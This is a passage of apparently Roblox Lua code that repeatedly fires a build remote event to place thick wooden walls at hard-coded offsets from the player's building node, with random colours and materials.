1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1383.21155, 340.981934, -662.281006, 0.432979524, -0.866023481, 0.250064135, 0.500003278, -8.10623169e-05, -0.866023481, 0.750016928, 0.500003278, 0.432979524))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1383.21155, 340.981934, -662.281006, 0.433065832, -0.866011918, -0.249954686, -0.500023305, -9.15527344e-05, -0.866011918, 0.749953747, 0.500023305, -0.433065891))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1383.21155, 340.981934, -662.281006, 0.499938965, -0.866060615, 1.18613243e-05, -1.18613243e-05, -2.05039978e-05, -1, 0.866060615, 0.499938965, -2.05039978e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1383.21155, 340.981934, -662.281006, 0.353609204, -0.866009116, -0.353537619, -0.707126379, -7.4505806e-05, -0.707087219, 0.612317622, 0.500028312, -0.612404227))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1383.21155, 340.981934, -662.281006, -2.06232071e-05, -0.86604017, 0.499974549, 1.00000012, -2.06232071e-05, 5.49852848e-06, 5.49852848e-06, 0.499974549, 0.866040111))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1362.22424, 340.981628, -625.934998, 0.499938965, -0.866060615, 1.18613243e-05, -1.18613243e-05, -2.05039978e-05, -1, 0.866060615, 0.499938965, -2.05039978e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1351.52197, 375.763092, -607.40033, 0.250115693, -0.865964949, 0.433066756, 0.866025984, 8.51750374e-05, -0.499998927, 0.432944685, 0.500104666, 0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1341.32727, 340.981506, -589.7453, -0.250115633, -0.865964949, 0.433066756, 0.866025984, -8.51154327e-05, 0.499998927, -0.432944685, 0.500104666, 0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1341.32727, 340.981506, -589.7453, -0.432979584, -0.866023481, 0.250064135, 0.500003278, 8.10623169e-05, 0.866023481, -0.750016928, 0.500003278, 0.432979524))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1341.32727, 340.981506, -589.7453, -0.499938965, -0.866060615, 1.18613243e-05, -1.18613243e-05, 2.05039978e-05, 1, -0.866060615, 0.499938965, -2.05039978e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1341.32727, 340.981506, -589.7453, -0.433011055, -0.865976095, -0.250173539, -0.50001061, -0.000167369843, 0.866019249, -0.749993801, 0.500085354, -0.432924747))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1362.22424, 340.981628, -625.934998, -2.06232071e-05, -0.86604017, 0.499974549, 1.00000012, -2.06232071e-05, 5.49852848e-06, 5.49852848e-06, 0.499974549, 0.866040111))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1362.22424, 340.981628, -625.934998, 0.249904335, -0.866026044, 0.433066756, 0.866026044, -0.000126123428, -0.499998957, 0.433066756, 0.499998957, 0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1362.22424, 340.981628, -625.934998, 0.433065832, -0.865980327, 0.250064135, 0.499928534, -8.10623169e-05, -0.866066635, 0.750016928, 0.500078022, 0.432893217))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1362.22424, 340.981628, -625.934998, 0.250010014, -0.86603719, -0.432983369, -0.86603719, -4.06503677e-05, -0.499979615, 0.432983369, 0.499979615, -0.750030637))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1362.22424, 340.981628, -625.934998, 0.433065832, -0.866027713, -0.249899924, -0.500070691, -0.00017786026, -0.865984559, 0.749922156, 0.499995947, -0.433152199))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1341.32727, 340.981506, -589.7453, -2.06232071e-05, -0.86604017, 0.499974549, 1.00000012, -2.06232071e-05, 5.49852848e-06, 5.49852848e-06, 0.499974549, 0.866040111))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1372.47693, 375.76355, -643.690125, 0.250115693, -0.865964949, 0.433066756, 0.866025984, 8.51750374e-05, -0.499998927, 0.432944685, 0.500104666, 0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1351.52197, 375.763092, -607.40033, 0.432979524, -0.866023481, 0.250064135, 0.500003278, -8.10623169e-05, -0.866023481, 0.750016928, 0.500003278, 0.432979524))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1351.52197, 375.763092, -607.40033, 0.499938965, -0.866060615, 1.18613243e-05, -1.18613243e-05, -2.05039978e-05, -1, 0.866060615, 0.499938965, -2.05039978e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1351.52197, 375.763092, -607.40033, 0.433011115, -0.865976095, -0.250173539, -0.50001061, 0.000167369843, -0.866019249, 0.749993801, 0.500085354, -0.432924747))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1351.52197, 375.763092, -607.400513, 0.250010014, -0.865980268, -0.433097273, -0.866041303, 2.04443932e-05, -0.499972522, 0.432975203, 0.500078261, -0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1351.52197, 375.763092, -607.40033, -2.06232071e-05, -0.86604017, 0.499974549, 1.00000012, -2.06232071e-05, 5.49852848e-06, 5.49852848e-06, 0.499974549, 0.866040111))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1372.47693, 375.76355, -643.690125, -2.06232071e-05, -0.86604017, 0.499974549, 1.00000012, -2.06232071e-05, 5.49852848e-06, 5.49852848e-06, 0.499974549, 0.866040111))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1372.47693, 375.76355, -643.690125, 0.250010014, -0.865980268, -0.433097273, -0.866041303, 2.04443932e-05, -0.499972522, 0.432975203, 0.500078261, -0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1372.47693, 375.76355, -643.690125, 0.432979524, -0.866023481, 0.250064135, 0.500003278, -8.10623169e-05, -0.866023481, 0.750016928, 0.500003278, 0.432979524))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1372.47693, 375.76355, -643.690125, 0.499938965, -0.866060615, 1.18613243e-05, -1.18613243e-05, -2.05039978e-05, -1, 0.866060615, 0.499938965, -2.05039978e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1260.88428, 375.493561, -688.98468, 0.250010014, 0.865980268, -0.433097273, 0.866041303, 2.04443932e-05, 0.499972522, 0.432975203, -0.500078261, -0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1249.84998, 341.531586, -669.876404, 0.250115693, 0.865964949, 0.433066756, -0.866025984, 8.51750374e-05, 0.499998927, 0.432944685, -0.500104666, 0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1291.65491, 341.530579, -742.274475, 0.499938965, 0.866060615, 1.18613243e-05, 1.18613243e-05, -2.05039978e-05, 1, 0.866060615, -0.499938965, -2.05039978e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1270.88953, 341.531097, -706.312927, -0.432979584, 0.866023481, 0.250064135, -0.500003278, 8.10623169e-05, -0.866023481, -0.750016928, -0.500003278, 0.432979524))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1249.84998, 341.531586, -669.876404, -2.06232071e-05, 0.86604017, 0.499974549, -1.00000012, -2.06232071e-05, -5.49852848e-06, 5.49852848e-06, -0.499974549, 0.866040111))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1249.84998, 341.531586, -669.876404, 0.432979524, 0.866023481, 0.250064135, -0.500003278, -8.10623169e-05, 0.866023481, 0.750016928, -0.500003278, 0.432979524))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1249.84998, 341.531586, -669.876404, 0.499938965, 0.866060615, 1.18613243e-05, 1.18613243e-05, -2.05039978e-05, 1, 0.866060615, -0.499938965, -2.05039978e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1249.84998, 341.531586, -669.876404, 0.250010014, 0.86594975, -0.433158308, 0.86607182, 2.04443932e-05, 0.499919683, 0.432914168, -0.50013113, -0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1249.84998, 341.531586, -669.876404, 0.433011115, 0.865976095, -0.250173539, 0.50001061, 0.000167369843, 0.866019249, 0.749993801, -0.500085354, -0.432924747))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1270.88953, 341.531097, -706.312927, -2.06232071e-05, 0.86604017, 0.499974549, -1.00000012, -2.06232071e-05, -5.49852848e-06, 5.49852848e-06, -0.499974549, 0.866040111))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1270.88953, 341.531097, -706.312927, -0.250115633, 0.865995467, -0.43300572, 0.865995467, 8.51750374e-05, -0.500051796, -0.43300572, -0.500051796, -0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1270.88953, 341.531097, -706.312927, -0.250115633, 0.865964949, 0.433066756, -0.866025984, -8.51154327e-05, -0.499998927, -0.432944685, -0.500104666, 0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1270.88953, 341.531097, -706.312927, -0.499938965, 0.866060615, 1.18613243e-05, 1.18613243e-05, 2.05039978e-05, -1, -0.866060615, -0.499938965, -2.05039978e-05))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1270.88953, 341.531097, -706.312927, -0.433065891, 0.866011918, -0.249954686, 0.500023305, 9.15527344e-05, -0.866011918, -0.749953747, -0.500023305, -0.433065891))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1281.83118, 375.493958, -725.262024, 0.250010014, 0.86594975, -0.433158308, 0.86607182, 2.04443932e-05, 0.499919683, 0.432914168, -0.50013113, -0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1291.65491, 341.530579, -742.274475, 0.250115693, 0.865964949, 0.433066756, -0.866025984, 8.51750374e-05, 0.499998927, 0.432944685, -0.500104666, 0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1291.65491, 341.530579, -742.274475, 0.432979524, 0.866023481, 0.250064135, -0.500003278, -8.10623169e-05, 0.866023481, 0.750016928, -0.500003278, 0.432979524))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1291.65491, 341.530579, -742.274475, 0.433011115, 0.865976095, -0.250173539, 0.50001061, 0.000167369843, 0.866019249, 0.749993801, -0.500085354, -0.432924747))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1291.65491, 341.530579, -742.274475, 0.250010014, 0.865980268, -0.433097273, 0.866041303, 2.04443932e-05, 0.499972522, 0.432975203, -0.500078261, -0.749969482))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1291.65491, 341.530579, -742.274475, -2.06232071e-05, 0.86604017, 0.499974549, -1.00000012, -2.06232071e-05, -5.49852848e-06, 5.49852848e-06, -0.499974549, 0.866040111))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1260.88428, 375.493561, -688.98468, 0.433011115, 0.865976095, -0.250173539, 0.50001061, 0.000167369843, 